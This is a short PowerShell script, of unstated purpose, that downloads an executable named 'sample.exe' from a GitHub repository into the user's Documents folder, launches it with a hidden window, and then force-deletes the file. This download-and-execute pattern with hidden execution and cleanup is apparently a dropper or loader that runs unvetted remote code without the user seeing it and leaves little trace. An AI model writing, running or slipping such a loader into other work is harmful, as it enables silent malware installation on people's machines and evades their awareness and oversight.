# Set the URL of the .exe file to download
$exeUrl = "https://github.com/gabrielnatasha15/sample/raw/main/sample.exe"

# Set the directory where you want to save the downloaded .exe file
$currentUser = $env:USERNAME
$downloadDirectory = "C:\Users\$currentUser\Documents"
$downloadFilePath = Join-Path -Path $downloadDirectory -ChildPath "sample.exe"

# Download the file using Invoke-WebRequest
Invoke-WebRequest -Uri $exeUrl -OutFile $downloadFilePath

# Launches "sample.exe" from $downloadDirectory in the background.
Start-Process -FilePath "$downloadDirectory\sample.exe" -WindowStyle Hidden -Wait

#Cleanup activity
Remove-Item -Path $downloadFilePath -Force
